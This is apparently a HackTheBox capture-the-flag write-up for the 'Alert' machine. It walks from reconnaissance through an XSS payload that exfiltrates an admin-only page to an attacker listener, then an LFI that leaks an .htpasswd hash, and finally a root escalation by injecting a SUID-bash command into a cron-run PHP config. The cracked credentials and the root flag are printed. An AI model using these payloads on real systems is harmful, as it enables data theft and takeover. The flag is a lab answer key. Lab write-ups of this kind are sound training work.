<div class="writeup-content">
    <div style="text-align: center;">
        <img src="/pngs/HTB/Easy/Alert/Alert.png" alt="Alert Banner" style="border:none; width: 300px; margin-bottom: 20px;">
        <h3 style="color: #3fb950;">Level: Easy</h3>
    </div>

    <h3 class="step-header">1. Reconnaissance</h3>
    <p>I started with port enumeration:</p>
    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.44</div>
    
    <ul>
        <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
        <li><strong>-sS</strong>: SYN stealth scan.</li>
        <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
    </ul>

    <p>Ports 22 (SSH) and 80 (HTTP) are open. Service scan:</p>
    <div class="terminal-box">nmap -sC -sV -p22,80 10.10.11.44</div>

    <p>The domain is <code>alert.htb</code>. I updated my <code>/etc/hosts</code> and performed vhost enumeration:</p>
    <div class="terminal-box">ffuf -w subdomains.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10</div>
    <p>Found a <code>statistics</code> subdomain that requires authentication.</p>

    <h3 class="step-header">2. Web Exploitation (XSS to LFI)</h3>
    <p>On the main site, the "Markdown Viewer" allows uploading <code>.md</code> files. I discovered that it is vulnerable to XSS. I crafted a payload to leak <code>messages.php</code> via the administrator's session:</p>

    <div class="terminal-box">&lt;script&gt;
fetch('http://alert.htb/messages.php')
.then(resp => resp.text())
.then(body => {
    fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body));
})
&lt;/script&gt;</div>

    <p>I sent the share link to the admin via the "Contact Us" form. The admin's visit triggered the script, exfiltrating the base64 content of <code>messages.php</code> to my listener.</p>

    <p>Decoding the data revealed a hidden file path:</p>
    <div class="terminal-box">echo "PGgxPk1lc3NhZ2VzPC9oMT4..." | base64 -d</div>

    <h3 class="step-header">3. Initial Access</h3>
    <p>Using the LFI vulnerability, I read the Apache configuration and found the <code>.htpasswd</code> file for the statistics subdomain:</p>
    <div class="terminal-box">albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</div>

    <p>Cracked the hash using <code>hashcat</code>:</p>
    <fieldset class="cred-box">
        <legend>Credentials</legend>
        <code>albert:manchesterunited</code>
    </fieldset>

    <h3 class="step-header">4. Privilege Escalation</h3>
    <p>Albert is part of the <code>management</code> group. I found a writable configuration file used by a root cronjob:</p>
    <div class="terminal-box">find / -group management 2>/dev/null</div>

    <p>I injected a command into <code>/opt/website-monitor/config/configuration.php</code> to create a SUID bash binary:</p>
    <div class="terminal-box">&lt;?php 
define('PATH', '/opt/website-monitor'); 
system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;'); 
?&gt;</div>

    <p>After the cronjob ran, I executed the binary with <code>-p</code> to get root:</p>
    <div class="terminal-box">/tmp/damn -p</div>

    <fieldset class="root-box">
        <legend>Root Flag</legend>
        <code>65383dc809d3cec5c567740343688722</code>
    </fieldset>
</div>
